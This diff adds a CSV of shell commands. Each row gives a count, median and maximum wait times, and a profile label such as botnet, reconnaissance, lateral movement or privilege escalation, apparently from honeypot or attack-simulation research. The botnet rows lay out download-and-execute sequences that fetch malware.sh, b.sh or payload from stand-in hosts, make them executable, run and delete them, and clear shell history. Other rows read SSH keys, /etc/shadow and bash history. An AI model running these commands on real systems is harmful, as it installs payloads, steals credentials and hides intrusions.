@@ -1,0 +1,153 @@
+command,n,median_wait_s,max_wait_s,profiles
+find / -name id_rsa 2>/dev/null,30,11.665,13.531,privilege_escalation
+ls -la /usr/bin | grep rws,57,0.156,0.157,privilege_escalation
+wget -qO- http://files.example/ip,6,0.062,0.063,reconnaissance
+wget http://mirror.example/update.sh,7,0.062,0.063,botnet
+wget http://mirror.example/b.sh,6,0.062,0.063,botnet
+curl -O http://pkg-repo.example/payload,1,0.062,0.062,botnet
+curl -O http://files.example/update.sh,4,0.055,0.063,botnet
+ping -c 2 192.0.2.5,14,0.054,0.063,lateral_movement
+rm malware.sh,14,0.054,0.063,botnet
+who,198,0.047,0.141,benign_admin
+free -m,213,0.047,0.093,benign_admin;reconnaissance
+ps aux,225,0.047,0.094,benign_admin;reconnaissance
+pwd,230,0.047,0.063,benign_admin;privilege_escalation;reconnaissance
+ls,156,0.047,0.063,benign_admin;reconnaissance
+service ssh status,111,0.047,0.078,benign_admin
+cat /etc/hosts,58,0.047,0.063,lateral_movement
+nc -zv 192.0.2.5 22,12,0.047,0.063,lateral_movement
+cat ~/.ssh/config,56,0.047,0.063,lateral_movement
+w,351,0.047,0.109,benign_admin;botnet;lateral_movement;privilege_escalation;reconnaissance
+nmap -sn 192.0.2.0/24,81,0.047,0.063,lateral_movement
+uptime,181,0.047,0.063,benign_admin
+du -sh /var/log,171,0.047,0.063,benign_admin
+date,124,0.047,0.063,benign_admin
+ps aux | grep sshd,202,0.047,0.078,benign_admin
+cat /etc/os-release,100,0.047,0.063,benign_admin;reconnaissance
+uname -a,151,0.047,0.063,botnet;brute_force;reconnaissance
+systemctl status ssh,106,0.047,0.063,benign_admin
+clear,99,0.047,0.063,benign_admin
+ls -la /var/log | tail -n 5,95,0.047,0.063,benign_admin
+df -h,217,0.047,0.063,benign_admin;reconnaissance
+service cron status,116,0.047,0.063,benign_admin
+ip route,80,0.047,0.063,lateral_movement;reconnaissance
+cat ~/.bash_history | grep ssh,51,0.047,0.063,lateral_movement
+ping -c 2 198.51.100.10,26,0.047,0.063,lateral_movement
+id,273,0.047,0.063,benign_admin;botnet;lateral_movement;privilege_escalation;reconnaissance
+hostname,125,0.047,0.063,benign_admin;lateral_movement;reconnaissance
+tail -n 50 /var/log/syslog,88,0.047,0.063,benign_admin
+curl -I http://pkg-repo.example/,26,0.047,0.063,benign_admin
+cat /proc/cpuinfo,72,0.047,0.063,botnet
+cd /dev/shm,45,0.047,0.063,botnet
+chmod +x update.sh,25,0.047,0.063,botnet
+sh update.sh,24,0.047,0.063,botnet
+cd /tmp,34,0.047,0.063,botnet
+wget http://mirror.example/payload,7,0.047,0.063,botnet
+enable,35,0.047,0.063,botnet
+chmod 777 payload,22,0.047,0.063,botnet
+sh payload,25,0.047,0.063,botnet
+rm payload,13,0.047,0.062,botnet
+wget -q http://files.example/b.sh -O b.sh,10,0.047,0.063,botnet
+chmod +x b.sh,26,0.047,0.063,botnet
+sh b.sh,20,0.047,0.063,botnet
+shell,43,0.047,0.063,botnet
+rm -rf b.sh,21,0.047,0.063,botnet
+system,34,0.047,0.063,botnet
+whoami,156,0.047,0.078,brute_force;lateral_movement;privilege_escalation;reconnaissance
+cat /etc/hosts | grep -v '^#',48,0.047,0.063,lateral_movement
+cat ~/.ssh/known_hosts,51,0.047,0.063,lateral_movement
+nc -zv 203.0.113.8 22,29,0.047,0.063,lateral_movement
+ls -la ~/.ssh,79,0.047,0.078,lateral_movement;privilege_escalation
+cat /etc/apt/sources.list,89,0.047,0.11,benign_admin
+uname -r,157,0.047,0.063,benign_admin;privilege_escalation;reconnaissance
+ifconfig,40,0.047,0.063,reconnaissance
+curl -s http://files.example/ip,11,0.047,0.063,reconnaissance
+groups,112,0.047,0.063,privilege_escalation;reconnaissance
+sudo -l,95,0.047,0.203,privilege_escalation
+ls -la,113,0.047,0.063,privilege_escalation;reconnaissance
+ls -la /etc/shadow,32,0.047,0.063,privilege_escalation
+cd /tmp || cd /var/tmp,91,0.047,0.063,botnet
+wget http://pkg-repo.example/update.sh,4,0.047,0.063,botnet
+chmod 777 update.sh,23,0.047,0.063,botnet
+./update.sh,24,0.047,0.063,botnet
+rm update.sh,19,0.047,0.063,botnet
+nc -zv 198.51.100.10 22,17,0.047,0.062,lateral_movement
+cat /etc/group,46,0.047,0.063,reconnaissance
+ip a,29,0.047,0.063,reconnaissance
+nproc,17,0.047,0.063,reconnaissance
+cat /proc/version,93,0.047,0.063,privilege_escalation;reconnaissance
+cat /etc/passwd | grep sh,44,0.047,0.063,reconnaissance
+ss -tulpn,33,0.047,0.063,reconnaissance
+curl -s http://pkg-repo.example/ip,9,0.047,0.063,reconnaissance
+wget -q http://pkg-repo.example/b.sh -O b.sh,5,0.047,0.062,botnet
+./b.sh,32,0.047,0.063,botnet
+uname -m,66,0.047,0.063,botnet
+echo ok,28,0.047,0.063,brute_force
+cat /etc/sudoers,80,0.047,0.063,privilege_escalation
+ls -la /root/.ssh,37,0.047,0.063,privilege_escalation
+ls -la /etc/cron.d,32,0.047,0.282,privilege_escalation
+cat /etc/issue,35,0.047,0.063,reconnaissance
+arp -a,41,0.047,0.063,lateral_movement
+ss -tan,31,0.047,0.063,lateral_movement
+cat ~/.bash_history,58,0.047,0.063,lateral_movement
+netstat -antp,79,0.047,0.063,lateral_movement;reconnaissance
+cat /etc/resolv.conf,26,0.047,0.078,reconnaissance
+wget -qO- http://mirror.example/ip,11,0.047,0.063,reconnaissance
+ping -c 2 203.0.113.8,15,0.047,0.063,lateral_movement
+cat /etc/passwd,50,0.047,0.063,reconnaissance
+wget -qO- http://pkg-repo.example/ip,10,0.047,0.063,reconnaissance
+journalctl -n 20,98,0.047,0.125,benign_admin
+cd /var/tmp,25,0.047,0.063,botnet
+wget -q http://mirror.example/b.sh -O b.sh,3,0.047,0.063,botnet
+find / -perm -u=s -type f 2>/dev/null,53,0.047,0.063,privilege_escalation
+ls -la /etc/passwd,38,0.047,0.063,privilege_escalation
+wget http://files.example/b.sh,8,0.047,0.047,botnet
+chmod 777 b.sh,26,0.047,0.063,botnet
+lscpu,18,0.047,0.063,reconnaissance
+curl -s http://mirror.example/ip,13,0.047,0.063,reconnaissance
+curl -I http://mirror.example/,30,0.047,0.063,benign_admin
+curl -O http://mirror.example/update.sh,9,0.047,0.063,botnet
+history -c,30,0.047,0.062,botnet
+wget -q http://mirror.example/malware.sh -O malware.sh,4,0.047,0.062,botnet
+chmod 777 malware.sh,28,0.047,0.063,botnet
+sh malware.sh,24,0.047,0.063,botnet
+curl -O http://files.example/malware.sh,7,0.047,0.062,botnet
+./malware.sh,23,0.047,0.063,botnet
+curl -O http://files.example/payload,3,0.047,0.063,botnet
+curl -O http://files.example/b.sh,5,0.047,0.063,botnet
+rm b.sh,15,0.047,0.063,botnet
+curl -I http://files.example/,24,0.047,0.063,benign_admin
+wget -q http://mirror.example/update.sh -O update.sh,6,0.047,0.063,botnet
+cat /etc/shadow,51,0.047,0.094,privilege_escalation
+crontab -l,27,0.047,0.063,privilege_escalation
+nc -zv 192.0.2.12 22,18,0.047,0.062,lateral_movement
+rm -rf update.sh,11,0.047,0.063,botnet
+wget http://files.example/update.sh,4,0.047,0.063,botnet
+wget -q http://files.example/payload -O payload,8,0.047,0.063,botnet
+chmod +x payload,26,0.047,0.062,botnet
+cat /etc/crontab,26,0.047,0.063,privilege_escalation
+find / -perm -4000 -type f 2>/dev/null,36,0.047,0.063,privilege_escalation
+rm -rf payload,23,0.047,0.063,botnet
+ping -c 2 192.0.2.12,12,0.047,0.047,lateral_movement
+rm -rf malware.sh,13,0.047,0.047,botnet
+curl -O http://pkg-repo.example/update.sh,9,0.047,0.063,botnet
+unset HISTFILE,21,0.047,0.063,botnet
+curl -O http://mirror.example/b.sh,7,0.047,0.063,botnet
+wget -q http://files.example/malware.sh -O malware.sh,9,0.047,0.109,botnet
+wget -q http://mirror.example/payload -O payload,5,0.047,0.062,botnet
+./payload,23,0.047,0.063,botnet
+curl -O http://mirror.example/malware.sh,7,0.047,0.063,botnet
+chmod +x malware.sh,19,0.047,0.063,botnet
+wget http://pkg-repo.example/payload,6,0.047,0.063,botnet
+wget http://mirror.example/malware.sh,7,0.047,0.063,botnet
+curl -O http://mirror.example/payload,3,0.047,0.047,botnet
+curl -O http://pkg-repo.example/malware.sh,4,0.047,0.047,botnet
+wget http://pkg-repo.example/b.sh,5,0.047,0.063,botnet
+wget -q http://pkg-repo.example/payload -O payload,7,0.047,0.063,botnet
+wget http://files.example/payload,8,0.047,0.063,botnet
+wget http://pkg-repo.example/malware.sh,3,0.047,0.047,botnet
+wget -q http://pkg-repo.example/update.sh -O update.sh,4,0.047,0.063,botnet
+wget http://files.example/malware.sh,4,0.047,0.047,botnet
+curl -O http://pkg-repo.example/b.sh,3,0.047,0.062,botnet
+wget -q http://pkg-repo.example/malware.sh -O malware.sh,2,0.047,0.047,botnet
+wget -q http://files.example/update.sh -O update.sh,1,0.047,0.047,botnet
